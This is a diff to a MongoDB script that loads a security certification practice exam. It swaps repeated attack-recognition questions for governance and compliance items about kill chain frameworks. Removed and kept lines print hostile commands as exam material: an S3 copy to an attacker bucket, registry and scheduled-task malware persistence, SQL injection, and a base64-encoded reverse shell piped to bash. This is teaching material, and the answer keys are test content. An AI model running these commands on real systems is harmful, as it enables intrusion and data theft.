@@ -97,29 +97,29 @@ db.tests.insertOne({
     },
     {
       "id": 8,
-      "question": "An attacker successfully compromises an AWS environment and executes the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
+      "question": "A large multinational enterprise is mapping advanced threats using Lockheed Martin’s Kill Chain, the Diamond Model, and MITRE ATT&CK to unify threat intelligence with a strict GRC framework. The compliance team is concerned about different data privacy laws restricting attacker profiling. Which approach BEST reconciles the kill chain analysis with these varying legal constraints while maintaining thorough threat intelligence?",
       "options": [
-        "Exfiltrating all files from a compromised S3 bucket",
-        "Enumerating active IAM roles",
-        "Compromising EC2 metadata for privilege escalation",
-        "Gaining shell access to a cloud instance"
+        "Adopt a high-level threat classification that anonymizes adversary details while retaining kill chain stages to ensure cross-border compliance.",
+        "Implement separate kill chain analyses for each region’s privacy laws, allowing full adversary identification in regions with fewer restrictions.",
+        "Remove all references to the adversary entirely and focus solely on TTP enumeration from MITRE ATT&CK, ignoring Diamond Model aspects.",
+        "Postpone kill chain integration until a global privacy standard emerges, maintaining partial logs of adversary data for future analysis."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
-      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
+      "explanation": "Anonymizing adversary details while preserving kill chain stages addresses local data-privacy requirements without sacrificing crucial threat intelligence.",
+      "examTip": "Regulatory alignment often requires adjusting the level of adversary-detail granularity to maintain compliance and operational security."
     },
     {
       "id": 9,
-      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
+      "question": "A newly formed GRC task force must integrate the Diamond Model’s ‘Victim’ stage with the MITRE ATT&CK matrix to unify detection controls in a heavily regulated environment. They face conflicting requirements about collecting technical data vs. personal data belonging to end-users. Which solution provides the most balanced approach to compliance while maintaining robust kill chain visibility?",
       "options": [
-        "Brute-forcing WPA2 Wi-Fi handshake hashes",
-        "Cracking NTLM password hashes",
-        "Performing a pass-the-hash attack",
-        "Decrypting SSL/TLS traffic"
+        "Partition the Diamond Model data into strictly technical system logs, referencing only anonymized user data when cross-mapped with ATT&CK.",
+        "Centralize all user and system data in one repository, applying region-specific encryption only after data ingestion.",
+        "Exclude any personal data from the Diamond Model, focusing solely on known threat actor TTPs, ignoring victim-based correlation.",
+        "Require each business unit to define its own data classification matrix, maintaining separate Diamond Model analyses per jurisdiction."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
-      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
+      "explanation": "Separating technical system data from anonymized user data ensures compliance with privacy laws while retaining critical insight for threat correlation.",
+      "examTip": "In cross-border GRC scenarios, combining anonymization strategies with robust frameworks like ATT&CK and Diamond Model helps maintain coverage without violating privacy."
     },
     {
       "id": 10,
@@ -136,7 +136,7 @@ db.tests.insertOne({
     },
     {
       "id": 11,
-      "question": "A security analyst detects a suspicious command executed on a compromised Windows machine:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"`\n\nWhat is the attacker's objective?",
+      "question": "A security analyst reviewing a suspicious command executed on a compromised Windows machine:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"`\n\nWhat is the attacker's objective?",
       "options": [
         "Executing JavaScript in a Windows environment to bypass security policies",
         "Disabling Windows event logging",
@@ -214,16 +214,16 @@ db.tests.insertOne({
     },
     {
       "id": 17,
-      "question": "An attacker executes the following SQL query:\n\n`SELECT username, password FROM users WHERE username='admin' --' AND password='password'`;\n\nWhat type of attack is being performed?",
+      "question": "An organization is adopting the Lockheed Martin Kill Chain in its governance framework. During the ‘Delivery’ phase, they realize that certain local regulations prohibit storing detailed logs about malicious IP addresses. However, that data is critical for the ‘Detection’ sub-phase in MITRE ATT&CK mapping. How should the GRC team reconcile these conflicting requirements to ensure both compliance and operational security?",
       "options": [
-        "SQL injection to bypass authentication",
-        "Cross-site scripting (XSS)",
-        "Remote code execution (RCE)",
-        "Privilege escalation"
+        "Implement a pseudonymization process for IP addresses, storing them in an obfuscated format that can be reversed under strict access controls.",
+        "Completely remove IP address data from all logs to ensure regulatory compliance, focusing only on the threat vector’s existence.",
+        "Allow indefinite retention of unmasked IP addresses but restrict access to the security team, ignoring data privacy concerns.",
+        "Outsource the entire logging process to an international vendor, transferring legal liability for data handling."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
-      "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
+      "explanation": "Pseudonymizing critical data satisfies privacy laws while preserving the ability to correlate malicious activity for detection.",
+      "examTip": "When bridging kill chain analytics with data privacy requirements, carefully adopt techniques that preserve threat intelligence while anonymizing regulated data."
     },
     {
       "id": 18,
@@ -240,33 +240,33 @@ db.tests.insertOne({
     },
     {
       "id": 19,
-      "question": "An attacker exploits a misconfigured S3 bucket and runs the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
+      "question": "A large financial institution is employing the Diamond Model to enhance its GRC posture. They are struggling to integrate the ‘Infrastructure’ axis with local laws that treat certain network identifiers as personally identifiable information (PII). The kill chain analysis depends on these network indicators to detect intrusions. Which method best achieves a compliant yet operational GRC framework?",
       "options": [
-        "Exfiltrating all files from a compromised S3 bucket",
-        "Enumerating active IAM roles",
-        "Compromising EC2 metadata for privilege escalation",
-        "Gaining shell access to a cloud instance"
+        "Utilize tokenization for network indicators that maps real addresses to anonymized tokens, enabling pattern analysis without revealing actual details.",
+        "Create a blanket policy disallowing the collection of any network indicators, focusing on purely behavioral analytics.",
+        "Maintain full logs in an offshore location, ignoring the local PII classification since they are stored outside the region.",
+        "Implement a rotating policy that periodically deletes all network indicators, then reacquires them only during known threat incidents."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
-      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
+      "explanation": "Tokenizing network indicators maintains the ability to correlate threats while adhering to laws treating certain identifiers as PII.",
+      "examTip": "Preserve the ability to cross-reference threat data while ensuring compliance by using anonymizing or tokenizing methods."
     },
     {
       "id": 20,
-      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
+      "question": "A multinational healthcare provider merges the MITRE ATT&CK framework with the Lockheed Martin Kill Chain to standardize threat detection across all offices. However, new cross-border privacy regulations conflict with retaining ‘Reconnaissance’ stage data for more than 30 days. How can the GRC program be designed to support advanced threat analysis without breaching data retention laws?",
       "options": [
-        "Brute-forcing WPA2 Wi-Fi handshake hashes",
-        "Cracking NTLM password hashes",
-        "Performing a pass-the-hash attack",
-        "Decrypting SSL/TLS traffic"
+        "Deploy a time-based retention policy that archives reconnaissance logs with cryptographic hashing.",
+        "Extend the retention period indefinitely by classifying reconnaissance logs as non-regulated data.",
+        "Eliminate the ‘Reconnaissance’ stage from the kill chain analysis entirely to avoid data conflicts.",
+        "Store all logs unencrypted in a single repository overseas, applying local laws of that jurisdiction."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
-      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
+      "explanation": "Using time-based archiving and hashed storage balances compliance requirements with the need to preserve threat intelligence.",
+      "examTip": "Balancing threat intelligence retention with privacy laws often involves partial data transformations like hashing or summarization."
     },
     {
       "id": 21,
-      "question": "A forensic analyst detects the following encoded command executed on a compromised Linux system:\n\n`echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuMTAvNDQzIDA+JjE=' | base64 -d | bash`\n\nWhat is the attacker's intent?",
+      "question": "A forensic analyst detects a suspicious command executed on a compromised Linux system:\n\n`echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuMTAvNDQzIDA+JjE=' | base64 -d | bash`\n\nWhat is the attacker's intent?",
       "options": [
         "Establishing a reverse shell to an external IP address",
         "Exfiltrating sensitive data via DNS tunneling",
@@ -370,16 +370,16 @@ db.tests.insertOne({
     },
     {
       "id": 29,
-      "question": "A forensic analyst detects a suspicious scheduled task with the following command:\n\n`schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'C:\\Users\\Public\\malware.exe'`\n\nWhat is the attacker's goal?",
+      "question": "A global retailer is implementing the Diamond Model for advanced threat correlation. They want to cross-reference the ‘Adversary’ pivot with Lockheed Martin Kill Chain stages, but they discover that certain jurisdictions restrict detailed attacker attribution in security reports. Which approach should the GRC lead adopt to ensure compliance while preserving robust correlation across kill chain stages?",
       "options": [
-        "Setting up a scheduled task that runs malware every 5 minutes",
-        "Clearing Windows event logs",
-        "Scanning the local network for open ports",
-        "Performing a brute-force attack"
+        "Aggregate attacker attribution under a generic tag (e.g., 'unknown external party') and maintain a private, encrypted index for full adversary details accessible only with special authorization.",
+        "Publish all adversary attributes openly but disclaim any liability for regions with stricter privacy laws.",
+        "Avoid any correlation on the ‘Adversary’ pivot entirely, focusing exclusively on TTP alignment with kill chain steps.",
+        "Delegate each region to create custom kill chain reports, excluding centralized correlation to satisfy local laws."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The `schtasks` command schedules a malicious executable to run every 5 minutes, ensuring persistence.",
-      "examTip": "Regularly audit scheduled tasks and remove unauthorized entries."
+      "explanation": "Storing detailed adversary data securely while using generic tags in official reporting meets local legal constraints and preserves correlation value.",
+      "examTip": "When local laws restrict attacker profiling, keep detailed intelligence in a secure repository and use high-level placeholders for framework alignment."
     },
     {
       "id": 30,
@@ -591,16 +591,16 @@ db.tests.insertOne({
     },
     {
       "id": 46,
-      "question": "An attacker executes the following SQL query:\n\n`SELECT username, password FROM users WHERE username='admin' --' AND password='password'`;\n\nWhat type of attack is being performed?",
+      "question": "A cross-border energy corporation relies on the Lockheed Martin Kill Chain to manage advanced threats. During a governance audit, they’re cited for non-compliance with data localization laws when storing ‘Weaponization’ stage intelligence in a foreign datacenter. How should they restructure their GRC strategy to remain consistent with kill chain methodology and meet localization requirements?",
       "options": [
-        "SQL injection to bypass authentication",
-        "Cross-site scripting (XSS)",
-        "Remote code execution (RCE)",
-        "Privilege escalation"
+        "Segment kill chain data storage by region, ensuring ‘Weaponization’ logs remain in the local datacenter while correlating them globally using metadata references.",
+        "Eliminate the ‘Weaponization’ stage entirely from kill chain analysis in countries with localization mandates.",
+        "Store all kill chain data in a single, globally accessible datacenter, relying on encryption at rest to satisfy data localization demands.",
+        "Replace the Lockheed Martin Kill Chain with an internal process that does not require external data sharing or correlation."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
-      "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
+      "explanation": "Preserving the kill chain approach while segmenting data by region ensures compliance with localization laws and still allows global correlation.",
+      "examTip": "Regional data localization laws often require careful data segmentation while preserving overall kill chain intelligence."
     },
     {
       "id": 47,
@@ -617,42 +617,42 @@ db.tests.insertOne({
     },
     {
       "id": 48,
-      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's intent?",
+      "question": "A multinational GRC council is tasked with mapping Diamond Model ‘Infrastructure’ components to Lockheed Martin Kill Chain steps. They face a new policy in one country requiring the immediate anonymization of all IP addresses upon collection. This policy hampers the correlation of attacker infrastructure across kill chain stages. What is the best solution to maintain GRC compliance and operational effectiveness?",
       "options": [
-        "Establishing persistence by executing malware at user login",
-        "Disabling Windows security policies",
-        "Exfiltrating user credentials from the Windows registry",
-        "Escalating privileges to a domain administrator"
+        "Implement an anonymization gateway that transforms IPs into hashed identifiers, enabling correlation across kill chain steps without storing raw IP data.",
+        "Create an exception for that country’s logs, collecting IP data in plain text for a short window and then discarding it entirely.",
+        "Use only the last octet of the IP address for correlation, ignoring the rest of the IP to meet anonymization requirements.",
+        "Suspend kill chain mapping for that country’s traffic until the policy is revised."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
-      "examTip": "Monitor registry modifications and enforce least privilege access controls."
+      "explanation": "Using a gateway that immediately hashes IP addresses preserves the ability to correlate threats while meeting the strict anonymization law.",
+      "examTip": "Regulatory constraints often require creative approaches like hashing or tokenization to preserve security analytics."
     },
     {
       "id": 49,
-      "question": "An attacker successfully exploits an AWS environment and executes the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
+      "question": "A global telecom is integrating MITRE ATT&CK into its existing Lockheed Martin Kill Chain framework. They must produce monthly compliance reports detailing each threat actor’s methods. However, a new rule requires that all attacker references in official documents be replaced with anonymized tags. How can the GRC team ensure the kill chain framework remains useful while satisfying the anonymization requirement?",
       "options": [
-        "Exfiltrating all files from a compromised S3 bucket",
-        "Enumerating active IAM roles",
-        "Compromising EC2 metadata for privilege escalation",
-        "Gaining shell access to a cloud instance"
+        "Develop a controlled alias system that links real attacker identifiers to coded references in official documents, permitting internal correlation while external reports use aliases.",
+        "Cease referencing any attacker methods in monthly reports and focus solely on kill chain phase transition data.",
+        "Publish a disclaimer that attacker identities are purely notional, continuing to use real identifiers in all official documents.",
+        "Implement fully separate kill chain analyses for each attacker, ensuring no cross-referencing in compliance reports."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
-      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
+      "explanation": "An alias system preserves full correlation internally while presenting anonymized tags in compliance documents, meeting both privacy and operational needs.",
+      "examTip": "When anonymization is mandated, internal references can remain intact if external reporting replaces them with standard aliases."
     },
     {
       "id": 50,
-      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
+      "question": "A newly-appointed Chief Risk Officer wants to unify all threat intelligence under a single governance policy referencing Lockheed Martin Kill Chain, Diamond Model, and MITRE ATT&CK. However, an internal privacy committee demands that any mention of ‘Exploitation’ techniques be generalized to avoid storing exploit-specific details that may reveal software vulnerabilities. Which solution best preserves the kill chain’s utility without violating privacy mandates?",
       "options": [
-        "Brute-forcing WPA2 Wi-Fi handshake hashes",
-        "Cracking NTLM password hashes",
-        "Performing a pass-the-hash attack",
-        "Decrypting SSL/TLS traffic"
+        "Implement a vulnerability abstraction layer that categorizes exploit details into high-level classes.",
+        "Exclude the ‘Exploitation’ stage from all GRC documentation, tracking only from ‘Installation’ onward.",
+        "Maintain full exploit details in a secured internal repository while referencing only minimal placeholders in official GRC documents.",
+        "Delay all kill chain–based threat intelligence processes until the privacy committee approves storing exploit data."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
-      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
+      "explanation": "Using an abstraction layer satisfies privacy by masking specific exploit details while maintaining valuable kill chain context.",
+      "examTip": "Detailed technical data can be masked or abstracted to meet privacy demands while preserving high-level risk management capabilities."
     },
     {
       "id": 51,
@@ -716,7 +716,7 @@ db.tests.insertOne({
         "Require all employees to acknowledge a corporate charter that includes a high-level compliance statement."
       ],
       "correctAnswerIndex": 2,
-      "explanation": "A well-defined governance structure ensures everyone understands their part in compliance and escalation workflows. Relying solely on legal advisors, advanced security operations, or blanket acknowledgments will likely miss necessary operational discipline for lasting governance.",
+      "explanation": "A well-defined governance structure ensures everyone understands their part in compliance and escalation workflows. Relying solely on legal advisors, advanced security operations, or blanket acknowledgments will likely miss the operational discipline needed.",
       "examTip": "Clarity in roles and responsibilities is the bedrock of a sustainable governance framework."
     },
     {
@@ -851,29 +851,29 @@ db.tests.insertOne({
     },
     {
       "id": 66,
-      "question": "An attacker executes the following SQL query:\n\n`SELECT username, password FROM users WHERE username='admin' --' AND password='password'`;\n\nWhat type of attack is being performed?",
+      "question": "A multi-national manufacturing firm is implementing a new GRC framework that merges Diamond Model ‘Capability’ elements with Lockheed Martin Kill Chain stages. Data protection laws in certain regions demand immediate encryption of all logs containing TTP details. This requirement complicates real-time correlation across the kill chain. Which approach best resolves the conflict without sacrificing detection speed?",
       "options": [
-        "SQL injection to bypass authentication",
-        "Cross-site scripting (XSS)",
-        "Remote code execution (RCE)",
-        "Privilege escalation"
+        "Use on-the-fly encryption with a shared ephemeral key accessible only to correlation services, ensuring minimal latency while meeting encryption mandates.",
+        "Wait until logs are fully ingested into a data lake, then encrypt them at rest, ignoring real-time correlation demands.",
+        "Only encrypt TTP details once a day to allow for correlation during business hours, deferring compliance until later.",
+        "Discontinue collecting TTP data in regions with strict encryption requirements, focusing correlation efforts on less regulated locations."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
-      "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
+      "explanation": "On-the-fly encryption with ephemeral keys satisfies the immediate encryption mandate and preserves near real-time kill chain correlation.",
+      "examTip": "Balancing real-time threat analytics with strict encryption laws often requires advanced cryptographic workflows that preserve performance."
     },
     {
       "id": 67,
-      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's intent?",
+      "question": "A global transport company aims to incorporate the Diamond Model ‘Social-Political’ attributes of adversaries into the Lockheed Martin Kill Chain for advanced GRC insights. However, certain countries prohibit collecting or storing any information tied to an attacker’s real-world identity. Which strategy ensures compliance and still supports meaningful kill chain-based threat intelligence?",
       "options": [
-        "Establishing persistence by executing malware at user login",
-        "Disabling Windows security policies",
-        "Exfiltrating user credentials from the Windows registry",
-        "Escalating privileges to a domain administrator"
+        "Substitute social-political attributes with generic threat categories, storing real adversary demographics only in an encrypted environment.",
+        "Eliminate all references to attacker motivations or backgrounds in the kill chain, focusing purely on technical TTP data.",
+        "Store all adversary social data in the public domain, claiming fair-use exceptions across jurisdictions.",
+        "Create a kill chain variant for each country that prohibits adversary identity data, effectively splintering the global approach."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
-      "examTip": "Monitor registry modifications and enforce least privilege access controls."
+      "explanation": "Keeping real-world identity data encrypted under strict governance while using generic categories externally meets legal requirements without losing kill chain richness.",
+      "examTip": "When regulations conflict with advanced adversary profiling, consider layered data storage solutions that segregate sensitive attributes."
     },
     {
       "id": 68,
@@ -890,16 +890,16 @@ db.tests.insertOne({
     },
     {
       "id": 69,
-      "question": "A forensic analyst reviewing network traffic logs detects multiple outbound connections to `169.254.169.254`. What is the most likely cause?",
+      "question": "A global hospitality chain uses the MITRE ATT&CK matrix in conjunction with the Lockheed Martin Kill Chain. While mapping the ‘Command and Control’ phase, they discover a new law requiring immediate deletion of any IP addresses flagged as malicious once an incident is closed. This conflicts with the organization’s standard practice of retaining such data for historical correlation. How should the GRC lead address this contradiction?",
       "options": [
-        "An attacker attempting to exploit cloud metadata services",
-        "A normal network configuration request",
-        "A botnet command-and-control communication",
-        "A DNS poisoning attack in progress"
+        "Implement an immediate purge mechanism for malicious IPs post-incident but maintain cryptographically hashed references for future correlation.",
+        "Continue storing IP data for historical correlation, noting an internal override of the new law for security reasons.",
+        "Retain malicious IP data in an anonymous offline archive, reintroducing them only if a repeated incident occurs.",
+        "Remove the ‘Command and Control’ phase from the kill chain to avoid collecting malicious IP data altogether."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The IP `169.254.169.254` is used by cloud providers (such as AWS) for metadata services, which attackers exploit to extract credentials.",
-      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
+      "explanation": "Purging actual IP data to comply with the law but retaining a hashed reference allows historical correlation without storing the raw address.",
+      "examTip": "Even with stringent data deletion mandates, hashed or anonymized indicators can provide a workable solution for maintaining correlation."
     },
     {
       "id": 70,
@@ -950,34 +950,34 @@ db.tests.insertOne({
         "Temporarily suspend operations in countries with conflicting regulations to avoid legal complications."
       ],
       "correctAnswerIndex": 2,
-      "explanation": "Implementing a global baseline while adding local compliance overlays meets unique jurisdictional demands without fragmenting the overall governance approach. Applying the strictest standard everywhere may introduce unnecessary operational burdens or conflicts.",
+      "explanation": "Implementing a global baseline while adding local compliance overlays meets unique jurisdictional demands without fragmenting the overall governance approach. Applying the strictest standard everywhere may introduce unnecessary operational burdens.",
       "examTip": "A hybrid approach accommodates regional legal obligations while preserving a unified organizational standard."
     },
     {
       "id": 74,
-      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's intent?",
+      "question": "An international bank enforces a Lockheed Martin Kill Chain approach, referencing Diamond Model attributes to track advanced threats. A new finance regulation prohibits storing any attacker economic profiles in local threat databases. The GRC team must still align kill chain data globally. What solution allows them to meet this regulation while retaining robust kill chain analytics for cross-border threat correlation?",
       "options": [
-        "Establishing persistence by executing malware at user login",
-        "Disabling Windows security policies",
-        "Exfiltrating user credentials from the Windows registry",
-        "Escalating privileges to a domain administrator"
+        "Store economic profiles in a centralized, restricted database outside the impacted region, referencing them indirectly through anonymized tokens in local logs.",
+        "Include attacker economic details only in ephemeral memory structures that are never written to disk in the local region.",
+        "Combine all economic profiling data with personal information about employees to create a single database exempt from standard finance regulations.",
+        "Drop the Diamond Model concept of ‘Adversary’ attributes to comply with the finance regulation, limiting kill chain references to purely technical data."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
-      "examTip": "Monitor registry modifications and enforce least privilege access controls."
+      "explanation": "Keeping regulated attacker economic profiles in a secure remote repository while referencing tokens locally meets the new finance rule and preserves threat correlation.",
+      "examTip": "Regional regulations often require data separation; referencing them with tokens can preserve global kill chain analytics without direct storage violations."
     },
     {
       "id": 75,
-      "question": "A forensic analyst reviewing network traffic logs detects multiple outbound connections to `169.254.169.254`. What is the most likely cause?",
+      "question": "A global payment processor integrates the Diamond Model with the Lockheed Martin Kill Chain to comply with internal GRC mandates. A newly enacted data privacy law compels immediate anonymization of ‘Delivery’ phase evidence once a transaction is cleared. However, the security team relies on such data for advanced correlation. Which approach satisfies the law without negating kill chain insights?",
       "options": [
-        "An attacker attempting to exploit cloud metadata services",
-        "A normal network configuration request",
-        "A botnet command-and-control communication",
-        "A DNS poisoning attack in progress"
+        "Anonymize ‘Delivery’ phase data upon transaction completion but store a derived fingerprint or hash to preserve correlation potential.",
+        "Retain all ‘Delivery’ phase evidence in plain text for at least six months before anonymizing, citing operational necessity.",
+        "Stop collecting ‘Delivery’ phase evidence altogether to comply immediately, relying on summarized threat bulletins from external intelligence feeds.",
+        "Encrypt ‘Delivery’ data with a rotating key that is destroyed monthly, effectively preventing re-correlation across incidents."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The IP `169.254.169.254` is used by cloud providers (such as AWS) for metadata services, which attackers exploit to extract credentials.",
-      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
+      "explanation": "By anonymizing or hashing the data post-clearance, the team meets legal requirements while still retaining correlation value for threat analysis.",
+      "examTip": "Retaining partial data in an anonymized or hashed format is critical for balancing advanced analytics with privacy mandates."
     },
     {
       "id": 76,
@@ -994,29 +994,29 @@ db.tests.insertOne({
     },
     {
       "id": 77,
-      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
+      "question": "A pharmaceutical giant merges Diamond Model analytics with MITRE ATT&CK to strengthen GRC oversight. It must regularly share ‘Installation’ stage details with third-party auditors. A new confidentiality clause states that specifics about internal systems must remain encrypted at all times. How can they provide sufficient detail for the auditors without exposing sensitive internal data that might violate the new clause?",
       "options": [
-        "Brute-forcing WPA2 Wi-Fi handshake hashes",
-        "Cracking NTLM password hashes",
-        "Performing a pass-the-hash attack",
-        "Decrypting SSL/TLS traffic"
+        "Use a de-identified environment mapping system that references internal hosts by coded labels, decrypting the real identities only when legally required.",
+        "Provide auditors with direct access to the raw logs, trusting them to maintain confidentiality under their own compliance guidelines.",
+        "Eliminate the ‘Installation’ stage from all external audit documentation, focusing only on pre- and post-installation phases.",
+        "Adopt a simplified kill chain variant that merges ‘Installation’ with ‘Command and Control’ to obscure references to internal systems."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
-      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
+      "explanation": "De-identifying internal systems while preserving stage-level data enables thorough audits without revealing proprietary environment details.",
+      "examTip": "When external audits require kill chain data, consider coded references to protect sensitive details while enabling third-party review."
     },
     {
       "id": 78,
-      "question": "An attacker successfully exploits an AWS environment and executes the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
+      "question": "A global technology vendor must align Diamond Model ‘Technology’ attributes with the Lockheed Martin Kill Chain for its GRC program. However, newly introduced supply chain security regulations demand real-time disclosure of all exploited hardware and software versions, potentially revealing proprietary technology used in the kill chain. Which approach best balances compliance with protecting trade secrets?",
       "options": [
-        "Exfiltrating all files from a compromised S3 bucket",
-        "Enumerating active IAM roles",
-        "Compromising EC2 metadata for privilege escalation",
-        "Gaining shell access to a cloud instance"
+        "Provide a high-level vulnerability type reference for hardware and software versions, maintaining a confidential mapping internally for detailed kill chain analysis.",
+        "Disclose every piece of hardware and software detail to regulators in real-time, relying on non-disclosure agreements for proprietary protection.",
+        "Withhold all hardware and software version information from regulators until the threat is fully contained, citing operational security.",
+        "Cease referencing technology attributes in the Diamond Model, focusing on attacker TTPs alone to meet supply chain security requirements."
       ],
       "correctAnswerIndex": 0,
-      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
-      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
+      "explanation": "Offering a summarized vulnerability view publicly while retaining detailed internal records satisfies real-time reporting requirements and preserves proprietary information.",
+      "examTip": "Regulatory compliance can be achieved by abstracting or summarizing sensitive details while preserving a full internal kill chain view."
     },
     {
       "id": 79,
@@ -1054,7 +1054,7 @@ db.tests.insertOne({
         "Immediately penalize departments that fail any aspect of compliance testing, regardless of mitigation attempts."
       ],
       "correctAnswerIndex": 1,
-      "explanation": "A continuous control monitoring (CCM) program identifies governance issues in real time, enabling rapid remediation. Arbitrarily adopting all standards or rotating audit teams does not necessarily target root causes of governance lapses and can increase overhead.",
+      "explanation": "A continuous control monitoring (CCM) program identifies governance issues in real time, enabling rapid remediation. Arbitrarily adopting all standards or rotating audit teams does not necessarily target the root causes of governance lapses.",
       "examTip": "Ongoing oversight and immediate remediation, rather than sporadic checks, are key to effective, long-term compliance management."
     },
     {
